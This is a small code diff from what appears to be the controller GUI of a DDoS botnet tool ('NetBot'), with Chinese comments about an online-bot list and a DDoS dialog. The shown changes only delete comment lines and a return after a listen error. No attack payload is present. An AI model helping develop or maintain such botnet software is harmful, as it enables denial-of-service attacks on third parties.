@@ -303,7 +303,6 @@ BOOL CNetBotDlg::OnInitDialog()
 	m_ImageOnlinelist.Add(hIcon0);
 	m_OnLineList.SetImageList(&m_ImageOnlinelist, LVSIL_SMALL);//在线列表框添加图标
 
-	////////////////////////////////////////////////////////////////////////
 	/****创建DDOS对话框*****/
 	CRect rcDlgs;
 	GetDlgItem(IDC_DLG_RECT)->GetWindowRect(rcDlgs);
@@ -617,7 +616,6 @@ void CNetBotDlg::OnBtnSelNum()
 	}
 }
 
-//////////////////////////////////////////////////////////////////////////////
 void CNetBotDlg::StartListen(int Port)
 {
 	m_ListenPort = Port;
@@ -629,7 +627,6 @@ void CNetBotDlg::StartListen(int Port)
 	{
 		StopListen();
 		ListenError(2);
-		return;
 	}
 }
 
